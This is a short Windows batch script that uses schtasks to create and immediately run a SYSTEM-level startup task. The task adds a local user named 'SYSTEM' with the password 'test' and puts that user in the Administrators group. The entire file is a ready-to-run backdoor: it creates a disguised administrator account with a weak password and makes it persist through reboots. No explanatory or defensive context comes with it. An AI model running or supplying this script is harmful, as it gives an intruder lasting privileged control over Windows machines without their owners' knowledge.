@echo off

set TASK_NAME=Add

set USERNAME=SYSTEM
set PASSWORD=test

:: Create the task with SYSTEM privileges
schtasks /create /tn "%TASK_NAME%" /tr "cmd /c net user %USERNAME% %PASSWORD% /add && net localgroup Administrators %USERNAME% /add" /sc ONSTART /rl HIGHEST /ru SYSTEM

:: Start the task
schtasks /run /tn "%TASK_NAME%"
